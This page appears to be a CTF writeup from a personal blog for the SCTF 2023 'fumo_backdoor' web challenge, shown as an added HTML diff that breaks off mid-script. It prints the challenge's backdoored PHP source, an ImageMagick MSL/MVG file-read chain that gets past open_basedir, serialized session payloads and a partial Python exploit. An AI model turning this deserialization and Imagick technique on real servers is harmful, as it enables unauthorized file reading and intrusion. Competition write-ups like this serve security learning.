@@ -1,0 +1,1691 @@
+<!DOCTYPE html><html lang="en">
+  <head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>SCTF 2023 Web writeup - DumKiy's blog</title>
+
+<meta name="description" content="fumo_backdoor  FUMO在你的网站上留下了后门 ᗜˬᗜ，她是怎么使用这个后门的捏？ ᗜˬᗜ（flag 在 /flag）Oops, looks like FUMO left a backdoor on your website ᗜˬᗜ! I wonder how she’s gonna use it,...">
+<link rel="canonical" href="http://localhost:4000/ctf/2023/06/20/SCTF-2023-Web-writeup.html"><link rel="alternate" type="application/rss+xml" title="DumKiy's blog" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">
+
+<meta name="msapplication-TileColor" content="#ffc40d"><meta name="msapplication-config" content="/assets/browserconfig.xml">
+
+<meta name="theme-color" content="#ffffff">
+<!-- end favicons snippet --><link rel="stylesheet" href="/assets/css/main.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css" ><!-- start custom head snippets -->
+
+<!-- end custom head snippets -->
+<script>(function() {
+  window.isArray = function(val) {
+    return Object.prototype.toString.call(val) === '[object Array]';
+  };
+  window.isString = function(val) {
+    return typeof val === 'string';
+  };
+
+  window.hasEvent = function(event) {
+    return 'on'.concat(event) in window.document;
+  };
+
+  window.isOverallScroller = function(node) {
+    return node === document.documentElement || node === document.body || node === window;
+  };
+
+  window.isFormElement = function(node) {
+    var tagName = node.tagName;
+    return tagName === 'INPUT' || tagName === 'SELECT' || tagName === 'TEXTAREA';
+  };
+
+  window.pageLoad = (function () {
+    var loaded = false, cbs = [];
+    window.addEventListener('load', function () {
+      var i;
+      loaded = true;
+      if (cbs.length > 0) {
+        for (i = 0; i < cbs.length; i++) {
+          cbs[i]();
+        }
+      }
+    });
+    return {
+      then: function(cb) {
+        cb && (loaded ? cb() : (cbs.push(cb)));
+      }
+    };
+  })();
+})();
+(function() {
+  window.throttle = function(func, wait) {
+    var args, result, thisArg, timeoutId, lastCalled = 0;
+
+    function trailingCall() {
+      lastCalled = new Date;
+      timeoutId = null;
+      result = func.apply(thisArg, args);
+    }
+    return function() {
+      var now = new Date,
+        remaining = wait - (now - lastCalled);
+
+      args = arguments;
+      thisArg = this;
+
+      if (remaining <= 0) {
+        clearTimeout(timeoutId);
+        timeoutId = null;
+        lastCalled = now;
+        result = func.apply(thisArg, args);
+      } else if (!timeoutId) {
+        timeoutId = setTimeout(trailingCall, remaining);
+      }
+      return result;
+    };
+  };
+})();
+(function() {
+  var Set = (function() {
+    var add = function(item) {
+      var i, data = this._data;
+      for (i = 0; i < data.length; i++) {
+        if (data[i] === item) {
+          return;
+        }
+      }
+      this.size ++;
+      data.push(item);
+      return data;
+    };
+
+    var Set = function(data) {
+      this.size = 0;
+      this._data = [];
+      var i;
+      if (data.length > 0) {
+        for (i = 0; i < data.length; i++) {
+          add.call(this, data[i]);
+        }
+      }
+    };
+    Set.prototype.add = add;
+    Set.prototype.get = function(index) { return this._data[index]; };
+    Set.prototype.has = function(item) {
+      var i, data = this._data;
+      for (i = 0; i < data.length; i++) {
+        if (this.get(i) === item) {
+          return true;
+        }
+      }
+      return false;
+    };
+    Set.prototype.is = function(map) {
+      if (map._data.length !== this._data.length) { return false; }
+      var i, j, flag, tData = this._data, mData = map._data;
+      for (i = 0; i < tData.length; i++) {
+        for (flag = false, j = 0; j < mData.length; j++) {
+          if (tData[i] === mData[j]) {
+            flag = true;
+            break;
+          }
+        }
+        if (!flag) { return false; }
+      }
+      return true;
+    };
+    Set.prototype.values = function() {
+      return this._data;
+    };
+    return Set;
+  })();
+
+  window.Lazyload = (function(doc) {
+    var queue = {js: [], css: []}, sources = {js: {}, css: {}}, context = this;
+    var createNode = function(name, attrs) {
+      var node = doc.createElement(name), attr;
+      for (attr in attrs) {
+        if (attrs.hasOwnProperty(attr)) {
+          node.setAttribute(attr, attrs[attr]);
+        }
+      }
+      return node;
+    };
+    var end = function(type, url) {
+      var s, q, qi, cbs, i, j, cur, val, flag;
+      if (type === 'js' || type ==='css') {
+        s = sources[type], q = queue[type];
+        s[url] = true;
+        for (i = 0; i < q.length; i++) {
+          cur = q[i];
+          if (cur.urls.has(url)) {
+            qi = cur, val = qi.urls.values();
+            qi && (cbs = qi.callbacks);
+            for (flag = true, j = 0; j < val.length; j++) {
+              cur = val[j];
+              if (!s[cur]) {
+                flag = false;
+              }
+            }
+            if (flag && cbs && cbs.length > 0) {
+              for (j = 0; j < cbs.length; j++) {
+                cbs[j].call(context);
+              }
+              qi.load = true;
+            }
+          }
+        }
+      }
+    };
+    var load = function(type, urls, callback) {
+      var s, q, qi, node, i, cur,
+        _urls = typeof urls === 'string' ? new Set([urls]) : new Set(urls), val, url;
+      if (type === 'js' || type ==='css') {
+        s = sources[type], q = queue[type];
+        for (i = 0; i < q.length; i++) {
+          cur = q[i];
+          if (_urls.is(cur.urls)) {
+            qi = cur;
+            break;
+          }
+        }
+        val = _urls.values();
+        if (qi) {
+          callback && (qi.load || qi.callbacks.push(callback));
+          callback && (qi.load && callback());
+        } else {
+          q.push({
+            urls: _urls,
+            callbacks: callback ? [callback] : [],
+            load: false
+          });
+          for (i = 0; i < val.length; i++) {
+            node = null, url = val[i];
+            if (s[url] === undefined) {
+              (type === 'js' ) && (node = createNode('script', { src: url }));
+              (type === 'css') && (node = createNode('link', { rel: 'stylesheet', href: url }));
+              if (node) {
+                node.onload = (function(type, url) {
+                  return function() {
+                    end(type, url);
+                  };
+                })(type, url);
+                (doc.head || doc.body).appendChild(node);
+                s[url] = false;
+              }
+            }
+          }
+        }
+      }
+    };
+    return {
+      js: function(url, callback) {
+        load('js', url, callback);
+      },
+      css: function(url, callback) {
+        load('css', url, callback);
+      }
+    };
+  })(this.document);
+})();
+</script><script>
+  (function() {
+    var TEXT_VARIABLES = {
+      version: '2.2.6',
+      sources: {
+        font_awesome: 'https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css',
+        jquery: 'https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js',
+        leancloud_js_sdk: '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js',
+        chart: 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js',
+        gitalk: {
+          js: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.js',
+          css: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.css'
+        },
+        valine: 'https://unpkg.com/valine/dist/Valine.min.js',
+        mathjax: 'https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML',
+        mermaid: 'https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js'
+      },
+      site: {
+        toc: {
+          selectors: 'h1,h2,h3,h4'
+        }
+      },
+      paths: {
+        search_js: '/assets/search.js'
+      }
+    };
+    window.TEXT_VARIABLES = TEXT_VARIABLES;
+  })();
+</script>
+</head>
+  <body>
+    <div class="root" data-is-touch="false">
+      <div class="layout--page js-page-root"><div class="page__main js-page-main page__viewport has-aside cell cell--auto">
+
+      <div class="page__main-inner"><div class="page__header d-print-none"><header class="header"><div class="main">
+      <div class="header__title">
+        <div class="header__brand"><?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
+ "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="512.000000pt" height="512.000000pt" viewBox="0 0 512.000000 512.000000"
+ preserveAspectRatio="xMidYMid meet">
+<metadata>
+Created by potrace 1.14, written by Peter Selinger 2001-2017
+</metadata>
+<g transform="translate(0.000000,512.000000) scale(0.100000,-0.100000)"
+fill="#000000" stroke="none">
+<path d="M825 4372 c-184 -12 -365 -129 -444 -287 -64 -129 -61 -53 -58 -1555
+l2 -1365 29 -70 c58 -141 151 -240 280 -299 110 -51 50 -49 1941 -48 1722 0
+1772 1 1837 20 183 52 330 209 373 395 13 58 15 235 13 1429 -2 995 -6 1370
+-14 1388 -7 14 -20 45 -30 70 -66 161 -226 287 -401 316 -36 6 -3441 12 -3528
+6z m3557 -236 c31 -13 70 -34 86 -47 42 -34 92 -113 107 -168 9 -35 11 -365
+10 -1376 -1 -1473 4 -1368 -66 -1459 -19 -24 -52 -56 -75 -70 -94 -60 34 -56
+-1883 -56 -1617 0 -1762 1 -1807 17 -27 9 -54 21 -61 27 -6 6 -27 22 -47 36
+-46 33 -92 112 -104 180 -15 77 -9 2674 5 2716 36 104 126 190 224 212 28 6
+684 10 1799 11 l1755 0 57 -23z"/>
+<path d="M1241 3509 c-27 -11 -47 -32 -61 -66 -22 -53 1 -81 409 -489 l395
+-394 -395 -394 c-289 -290 -397 -404 -406 -430 -31 -90 68 -165 154 -117 10 5
+215 207 455 448 291 291 439 447 443 466 4 15 4 39 0 55 -7 30 -860 893 -907
+918 -31 16 -53 17 -87 3z"/>
+<path d="M2551 1809 c-105 -14 -133 -147 -41 -194 44 -23 1336 -23 1380 0 71
+37 73 136 4 182 -23 15 -84 16 -662 17 -350 1 -657 -2 -681 -5z"/>
+</g>
+</svg>
+<a title="Watch And Learn
+" href="/">DumKiy's blog</a></div><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></div><nav class="navigation">
+        <ul><li class="navigation__item"><a href="/">Home</a></li><li class="navigation__item"><a href="/categories.html">Categories</a></li><li class="navigation__item"><a href="/tags.html">tags</a></li><li class="navigation__item"><a href="/about.html">About</a></li><li class="navigation__item"><a href="https://github.com/DummyKitty">GitHub</a></li><li><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></li></ul>
+      </nav></div>
+  </header>
+</div><div class="page__content"><div class ="main"><div class="grid grid--reverse">
+
+              <div class="col-aside d-print-none js-col-aside"><aside class="page__aside js-page-aside"><div class="toc-aside js-toc-root"></div>
+</aside></div>
+
+              <div class="col-main cell cell--auto"><!-- start custom main top snippet -->
+
+<!-- end custom main top snippet -->
+<article itemscope itemtype="http://schema.org/Article"><div class="article__header"><header><h1>SCTF 2023 Web writeup</h1></header><span class="split-space">&nbsp;</span>
+          <a class="edit-on-github"
+            title="Edit on Github"
+            href="https://github.com/user_name/repo_name/tree/master/_posts/2023-06-20-SCTF-2023-Web-writeup.md">
+            <i class="far fa-edit"></i></a></div><meta itemprop="headline" content="SCTF 2023 Web writeup"><div class="article__info clearfix"><ul class="left-col menu"><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/archive.html?tag=flask+debug+rce">flask debug rce</a>
+            </li><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/archive.html?tag=imagemagick">imagemagick</a>
+            </li><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/archive.html?tag=ssh">ssh</a>
+            </li><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/archive.html?tag=zip+slip">zip slip</a>
+            </li><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/archive.html?tag=request+smuggling">request smuggling</a>
+            </li></ul><ul class="right-col menu"><li><i class="far fa-calendar-alt"></i> <span>Jun 20, 2023</span>
+            </li></ul></div><meta itemprop="author" content="DumKiy"/><meta itemprop="datePublished" content="2023-06-20T13:34:21+08:00">
+    <meta itemprop="keywords" content="flask debug rce,imagemagick,ssh,zip slip,request smuggling"><div class="js-article-content"><div class="layout--article"><!-- start custom article top snippet -->
+
+<!-- end custom article top snippet -->
+<div class="article__content" itemprop="articleBody"><p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20230620081150.png" alt="20230620081150" /></p>
+
+<h1 id="fumo_backdoor">fumo_backdoor</h1>
+<blockquote>
+  <p>FUMO在你的网站上留下了后门 ᗜˬᗜ，她是怎么使用这个后门的捏？ ᗜˬᗜ（flag 在 /flag）
+Oops, looks like FUMO left a backdoor on your website ᗜˬᗜ! I wonder how she’s gonna use it, teehee~ (flag in /flag)
+http://182.92.6.230:18080
+http://47.99.77.113:18080/
+题目附件：https://adworld.xctf.org.cn/media/file/task/96a478b7-b206-403e-8430-886186a82097.zip</p>
+</blockquote>
+
+<p>题目给出了源码如下：</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="nb">ini_set</span><span class="p">(</span><span class="s1">'open_basedir'</span><span class="p">,</span> <span class="k">__DIR__</span><span class="mf">.</span><span class="s2">":/tmp"</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s2">"FUNC_LIST"</span><span class="p">,</span> <span class="nb">get_defined_functions</span><span class="p">());</span>
+
+<span class="kd">class</span> <span class="nc">fumo_backdoor</span> <span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$path</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$argv</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$func</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$class</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+    
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__sleep</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span>
+            <span class="nb">file_exists</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">path</span><span class="p">)</span> <span class="o">&amp;&amp;</span> 
+            <span class="nb">preg_match_all</span><span class="p">(</span><span class="s1">'/[flag]/m'</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">path</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span>
+        <span class="p">)</span> <span class="p">{</span>
+            <span class="nb">readfile</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">path</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__wakeup</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nv">$func</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">func</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span>
+            <span class="nb">is_string</span><span class="p">(</span><span class="nv">$func</span><span class="p">)</span> <span class="o">&amp;&amp;</span> 
+            <span class="nb">in_array</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="no">FUNC_LIST</span><span class="p">[</span><span class="s2">"internal"</span><span class="p">])</span>
+        <span class="p">)</span> <span class="p">{</span>
+            <span class="nb">call_user_func</span><span class="p">(</span><span class="nv">$func</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nv">$argv</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">argv</span><span class="p">;</span>
+            <span class="nv">$class</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">class</span><span class="p">;</span>
+            
+            <span class="k">new</span> <span class="nv">$class</span><span class="p">(</span><span class="nv">$argv</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nv">$cmd</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">];</span>
+<span class="nv">$data</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'data'</span><span class="p">];</span>
+
+<span class="k">switch</span> <span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">case</span> <span class="s1">'unserialze'</span><span class="o">:</span>
+        <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+        <span class="k">break</span><span class="p">;</span>
+    
+    <span class="k">case</span> <span class="s1">'rm'</span><span class="o">:</span>
+        <span class="nb">system</span><span class="p">(</span><span class="s2">"rm -rf /tmp 2&gt;/dev/null"</span><span class="p">);</span>
+        <span class="k">break</span><span class="p">;</span>
+    
+    <span class="k">default</span><span class="o">:</span>
+        <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+        <span class="k">break</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>这道题与历史赛题类似：</p>
+<ul>
+  <li><a href="https://github.com/AFKL-CUIT/CTF-Challenges/blob/master/CISCN/2022/backdoor/writup/writup.md">CTF-Challenges/CISCN/2022/backdoor/writup/writup.md at master · AFKL-CUIT/CTF-Challenges · GitHub</a></li>
+</ul>
+
+<p>与这道题的思路类似，这道题需要进行文件读取，前半段的利用基本一致：</p>
+<ol>
+  <li>在临时文件中写入 msl</li>
+  <li>利用 msl 文件初始化 Imagick，写入 session 文件，此时 session 文件的内容为 fumo_backdoor 的序列化数据。</li>
+  <li>调用无参函数 session_start ，session_start 会将会话数据反序列化得到 fumo_backdoor 对象，会话结束时会将这个 fumo_backdoor 再次序列化，从而调用到 <code class="language-plaintext highlighter-rouge">__sleep</code> 方法。</li>
+</ol>
+
+<p>这里的 <code class="language-plaintext highlighter-rouge">__sleep</code> 方法只能进行文件读取，并且 index.php 设置链 open_basedir，无法直接读取到 /flag。</p>
+
+<p>由于 Imagick 底层实现并不在 php 里，因此使用 Imagick 去读取文件可以无视 open_basedir。问题再于找到 Imagick 中能够读取某个文件，并且写入 /tmp 路径下的利用链。相关思路可以借鉴 <a href="https://imagetragick.com/">ImageTragick</a> 这篇文章，历史上 Imagick 存在类似的利用（直接构造 mvg 文件去读取文件）</p>
+
+<p>测试时发现使用 mvg 格式可以读取 /flag。</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">new</span> <span class="nc">Imagick</span><span class="p">(</span><span class="s2">"vid:msl:/var/www/html/msl.txt"</span><span class="p">);</span>
+</code></pre></div></div>
+<blockquote>
+  <p>Nu1L 战队的 writeup 中使用了另外一种格式 uyvy。相关参考连接：<a href="https://github.com/ImageMagick/ImageMagick/blob/main/www/formats.html">ImageMagick/www/formats.html at main · ImageMagick/ImageMagick · GitHub</a></p>
+</blockquote>
+
+<p>msl 文件内容如下：</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="nt">&lt;image&gt;</span>
+ <span class="nt">&lt;read</span> <span class="na">filename=</span><span class="s">"mvg:/flag"</span> <span class="nt">/&gt;</span>
+ <span class="nt">&lt;write</span> <span class="na">filename=</span><span class="s">"/tmp/xxxx"</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;/image&gt;</span>
+</code></pre></div></div>
+<p>执行后可以将 /flag 的内容拷贝到 /tmp 下。</p>
+
+<p>结合前面的思路，总的利用过程如下：</p>
+<ol>
+  <li>利用 msl 文件初始化 Imagick， 将 /flag 拷贝到 /tmp 目录下</li>
+  <li>利用 msl 文件初始化 Imagick，写入 session 文件，此时 session 文件的内容为 fumo_backdoor 的序列化数据。</li>
+  <li>调用无参函数 session_start ，session_start 会将会话数据反序列化得到 fumo_backdoor 对象，会话结束时会将这个 fumo_backdoor 再次序列化，从而调用到 <code class="language-plaintext highlighter-rouge">__sleep</code> 方法读取 /tmp 下的 flag 文件。</li>
+</ol>
+
+<p><strong>注意</strong>：在 session_start 之后会将将存储在 session 中的 fumo_backdoor 进行反序列化，此时会触发 <code class="language-plaintext highlighter-rouge">__wakeup</code> 函数，这里调用 <code class="language-plaintext highlighter-rouge">__wakeup</code> 函数 不能产生报错，否则在 session 会话结束后调用 <code class="language-plaintext highlighter-rouge">__sleep</code> 方法无法获取输出。为了方便可以将 func 填充为一个无用的函数，例如 zend_version</p>
+
+<p>EXP 如下：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">base64</span> 
+<span class="kn">import</span> <span class="n">time</span>
+<span class="kn">import</span> <span class="n">re</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://192.168.137.131:28999/index.php</span><span class="sh">"</span>
+<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://182.92.6.230:18080</span><span class="sh">"</span>
+<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="sh">"</span><span class="s">http</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">http://127.0.0.1:8080</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">https</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">http://127.0.0.1:8080</span><span class="sh">"</span>
+<span class="p">}</span>
+
+<span class="n">write_session_params</span> <span class="o">=</span> <span class="sh">'</span><span class="s">O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A17%3A%22vid%3Amsl%3A%2Ftmp%2Fphp%2A%22%3Bs%3A4%3A%22func%22%3Bb%3A0%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22imagick%22%3B%7D</span><span class="sh">'</span>
+
+<span class="n">trigger_sleep_payload</span> <span class="o">=</span> <span class="sh">'</span><span class="s">aaa|O:13:</span><span class="sh">"</span><span class="s">fumo_backdoor</span><span class="sh">"</span><span class="s">:4:{s:4:</span><span class="sh">"</span><span class="s">path</span><span class="sh">"</span><span class="s">;s:9:</span><span class="sh">"</span><span class="s">/tmp/xxxx</span><span class="sh">"</span><span class="s">;s:4:</span><span class="sh">"</span><span class="s">argv</span><span class="sh">"</span><span class="s">;N;s:4:</span><span class="sh">"</span><span class="s">func</span><span class="sh">"</span><span class="s">;s:12:</span><span class="sh">"</span><span class="s">zend_version</span><span class="sh">"</span><span class="s">;s:5:</span><span class="sh">"</span><span class="s">class</span><span class="sh">"</span><span class="s">;N;}</span><span class="sh">'</span>
+
+<span class="n">trigger_sleep_params</span> <span class="o">=</span> <span class="sh">'</span><span class="s">O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3BN%3Bs%3A4%3A%22func%22%3Bs%3A13%3A%22session_start%22%3Bs%3A5%3A%22class%22%3BN%3B%7D&amp;cmd=unserialze</span><span class="sh">'</span>
+
+
+<span class="k">def</span> <span class="nf">gen_ppm</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+    <span class="n">ppm_content</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">P6
+9 9
+255
+{}</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">((</span><span class="mi">243</span><span class="o">-</span><span class="nf">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span><span class="o">*</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+    <span class="n">ppm_content</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">ppm_content</span><span class="p">.</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">decode</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">ppm_content</span>
+
+<span class="k">def</span> <span class="nf">rm_tmp_file</span><span class="p">():</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">Accept</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">*/*</span><span class="sh">"</span><span class="p">}</span>
+    <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span>
+        <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">/?cmd=rm</span><span class="sh">"</span><span class="p">,</span>
+        <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span>
+        <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span>
+    <span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">upload_file</span><span class="p">(</span><span class="n">file_content</span><span class="p">,</span><span class="n">file_path</span><span class="p">):</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="sh">"</span><span class="s">Accept</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">*/*</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">Content-Type</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">multipart/form-data; boundary=------------------------c32aaddf3d8fd979</span><span class="sh">"</span>
+    <span class="p">}</span>
+
+    <span class="n">data</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">--------------------------c32aaddf3d8fd979</span><span class="se">\r\n</span><span class="s">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s">swarm</span><span class="se">\"</span><span class="s">; filename=</span><span class="se">\"</span><span class="s">swarm.msl</span><span class="se">\"\r\n</span><span class="s">Content-Type: application/octet-stream</span><span class="se">\r\n\r\n</span><span class="s">&lt;?xml version=</span><span class="se">\"</span><span class="s">1.0</span><span class="se">\"</span><span class="s"> encoding=</span><span class="se">\"</span><span class="s">UTF-8</span><span class="se">\"</span><span class="s">?&gt;</span><span class="se">\r\n</span><span class="s">&lt;image&gt;</span><span class="se">\r\n</span><span class="s"> &lt;read filename=</span><span class="se">\"</span><span class="s">inline:data://image/x-portable-anymap;base64,</span><span class="si">{</span><span class="n">file_content</span><span class="si">}</span><span class="se">\"</span><span class="s"> /&gt;</span><span class="se">\r\n</span><span class="s"> &lt;write filename=</span><span class="se">\"</span><span class="si">{</span><span class="n">file_path</span><span class="si">}</span><span class="se">\"</span><span class="s"> /&gt;</span><span class="se">\r\n</span><span class="s">&lt;/image&gt;</span><span class="se">\r\n</span><span class="s">--------------------------c32aaddf3d8fd979--</span><span class="sh">"</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span>
+            <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">/?data=</span><span class="si">{</span><span class="n">write_session_params</span><span class="si">}</span><span class="s">&amp;cmd=unserialze</span><span class="sh">"</span><span class="p">,</span>
+            <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span>
+        <span class="p">)</span>
+    <span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="nb">ConnectionError</span><span class="p">:</span>
+        <span class="k">pass</span>
+
+
+<span class="k">def</span> <span class="nf">upload_session</span><span class="p">():</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="nf">gen_ppm</span><span class="p">(</span><span class="n">trigger_sleep_payload</span><span class="p">)</span>
+    <span class="nf">upload_file</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="sh">"</span><span class="s">/tmp/sess_afkl</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">copy_flag</span><span class="p">():</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="sh">"</span><span class="s">Accept</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">*/*</span><span class="sh">"</span><span class="p">,</span>
+        <span class="sh">"</span><span class="s">Content-Type</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">multipart/form-data; boundary=------------------------c32aaddf3d8fd979</span><span class="sh">"</span>
+    <span class="p">}</span>
+
+    <span class="n">data</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">--------------------------c32aaddf3d8fd979</span><span class="se">\r\n</span><span class="s">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s">swarm</span><span class="se">\"</span><span class="s">; filename=</span><span class="se">\"</span><span class="s">swarm.msl</span><span class="se">\"\r\n</span><span class="s">Content-Type: application/octet-stream</span><span class="se">\r\n\r\n</span><span class="s">&lt;?xml version=</span><span class="se">\"</span><span class="s">1.0</span><span class="se">\"</span><span class="s"> encoding=</span><span class="se">\"</span><span class="s">UTF-8</span><span class="se">\"</span><span class="s">?&gt;</span><span class="se">\r\n</span><span class="s">&lt;image&gt;</span><span class="se">\r\n</span><span class="s"> &lt;read filename=</span><span class="se">\"</span><span class="s">mvg:/flag</span><span class="se">\"</span><span class="s"> /&gt;</span><span class="se">\r\n</span><span class="s"> &lt;write filename=</span><span class="se">\"</span><span class="s">/tmp/xxxx</span><span class="se">\"</span><span class="s"> /&gt;</span><span class="se">\r\n</span><span class="s">&lt;/image&gt;</span><span class="se">\r\n</span><span class="s">--------------------------c32aaddf3d8fd979--</span><span class="sh">"</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span>
